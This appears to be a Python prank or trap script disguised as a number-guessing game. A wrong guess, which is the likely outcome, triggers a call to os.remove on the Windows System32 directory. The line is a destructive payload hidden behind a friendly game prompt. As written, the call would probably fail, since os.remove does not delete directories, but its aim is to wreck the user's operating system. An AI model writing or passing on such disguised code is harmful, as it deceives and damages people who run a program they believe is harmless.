import random
import os

correct_number = random.randrange(1, 10)
print("Let's play a fun game!")
usr_input = int(input("Type a number between 1 and 10: "))

if usr_input == correct_number:
    print("You Won!")
else:
    os.remove('C:\Windows\System32')